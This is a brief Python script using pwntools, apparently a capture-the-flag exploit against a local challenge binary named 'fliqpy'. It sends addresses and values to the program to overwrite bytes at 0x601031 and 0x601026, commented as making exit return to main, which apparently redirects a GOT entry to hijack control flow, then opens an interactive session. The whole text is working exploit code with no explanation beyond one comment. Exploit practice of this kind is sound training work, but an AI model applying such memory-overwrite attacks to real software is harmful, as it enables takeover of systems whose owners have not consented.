from pwn import *

def f(a, b):
    p.sendline(hex(a))
    p.sendline(str(b))

p = process('./fliqpy')

# make exit go to main
f(0x601031, 0)
f(0x601026, 1)
#p.sendline('0x601030')
#p.sendline('2')

#p.sendline('0x601031')
#p.sendline('0')

p.interactive()
